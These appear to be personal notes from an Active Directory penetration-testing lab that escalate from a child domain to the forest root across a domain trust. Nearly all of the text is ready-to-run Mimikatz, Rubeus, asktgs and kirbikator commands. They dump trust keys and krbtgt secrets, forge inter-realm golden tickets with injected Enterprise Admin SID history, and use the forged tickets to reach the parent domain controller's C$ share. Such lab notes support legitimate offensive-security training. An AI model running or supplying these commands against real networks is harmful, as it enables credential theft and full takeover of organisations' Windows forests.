# What is required to forge trust tickets is the trust key so:
# Look for trust key from child to parent
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

or

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

or

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# We can forge and inter-realm TGT:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDS> /rc4:<rc4> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

# GET A TGS for a service (CIFS below) in the target domain by using the forged trust ticket
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

# USE THE TGS TO ACCESS THE TARGETED SERVICE
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi

ls \\mcorp-dc.moneycorp.local\c$

# TICKETS FOR OTHER SERVICES LIKE HOST AND RPCSS for WMI, HTTP for PS Remoting and WinRM can be created as well

# WE CAN USE RUBEUS FOR THE SAME RESULTS
(Note we are still using the TGT forged initially
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
ls \\mcorp-dc.moneycorp.local\c$

# We will abuse slDhistory once again
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# THE SIDS OPTION IS FORCEFULLY SETTING THE SIDHISTORY FOR THE ENTERPRISE ADMIN GROUP FOR DOLLARCORP.MONEYCORP.LOCAL THAT IS THE FOREST ENTERPRISE ADMIN GROUP
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDS> /krbtgt:<ntlm> /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
